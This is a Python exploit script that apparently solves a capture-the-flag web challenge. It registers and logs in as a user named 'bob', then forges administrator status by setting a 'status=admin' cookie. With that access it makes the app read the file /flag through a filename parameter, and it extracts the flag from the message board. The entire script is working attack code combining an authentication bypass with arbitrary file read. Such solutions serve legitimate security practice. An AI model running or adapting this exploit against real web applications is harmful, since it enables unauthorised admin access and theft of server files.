#!/usr/bin/env python3

import re
import sys

import requests


def main() -> int:
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_base_url>")
        print(f"Example: {sys.argv[0]} http://127.0.0.1:5544")
        return 1

    target = sys.argv[1].rstrip("/")

    headers = {"User-Agent": "MotorolaStarTAC/1.0"}

    # Establish a normal session by registering + logging in as bob
    session = requests.Session()
    creds = {"username": "bob", "password": "password123"}
    session.post(f"{target}/register", data=creds, timeout=5)
    login_response = session.post(f"{target}/login", data=creds, timeout=5)
    if login_response.status_code != 200:
        print("[-] Failed to login as bob.")
        return 1

    # Forge admin status via cookie manipulation
    evil_cookies = session.cookies.get_dict()
    evil_cookies["status"] = "admin"

    # Force admin to read /flag and post it to the message board
    post_response = session.post(
        f"{target}/admin_post",
        cookies=evil_cookies,
        data={"filename": "/flag"},
        headers=headers,
        timeout=5,
        allow_redirects=True,
    )
    if post_response.status_code != 200:
        print(f"[-] Failed to post flag! Status code: {post_response.status_code}")
        return 1

    board_response = session.get(
        f"{target}/", cookies=evil_cookies, headers=headers, timeout=5
    )
    if board_response.status_code != 200:
        print(f"[-] Failed to fetch message board! Status code: {board_response.status_code}")
        return 1

    m = re.search(r"ictf\\{[^}]+\\}", board_response.text)
    if m:
        print(m.group(0))
        return 0

    print(board_response.text)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

